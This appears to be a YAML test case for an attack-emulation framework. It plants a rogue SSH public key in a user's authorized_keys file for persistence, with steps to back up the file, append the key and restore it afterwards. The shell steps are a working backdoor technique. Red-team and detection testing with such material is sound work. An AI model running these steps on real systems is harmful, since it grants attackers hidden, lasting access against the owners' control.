---
name: backdoor-authorized-keys
description: |
  Add rogue public SSH key to `$HOME/.ssh/authorized_keys` to maintain
  persistence on a target system.
args:
  - name: ssh_authorized_keys
    default: "${HOME}/.ssh/authorized_keys"
  - name: rogue_key
    description: "The rogue public SSH key to be added"
  - name: cleanup
    default: true

steps:
  - name: ensure-authorized_keys-present
    inline: |
      set -e

      if [[ ! -f "{{ .Args.ssh_authorized_keys }}" ]]; then
        echo "Error: no authorized_keys file present at the specified path."
        exit 1
      fi

  - name: backup-authorized_keys
    inline: |
      set -e

      cp "{{ .Args.ssh_authorized_keys }}" "{{ .Args.ssh_authorized_keys }}.bak"

  - name: modify-authorized_keys
    inline: |
      set -e

      echo "{{ .Args.rogue_key }}" >> "{{ .Args.ssh_authorized_keys }}"

  - name: cleanup
    inline: |
      set -e

      if [[ "{{ .Args.cleanup }}" == true ]]; then
        mv "{{ .Args.ssh_authorized_keys }}.bak" "{{ .Args.ssh_authorized_keys }}"
      fi
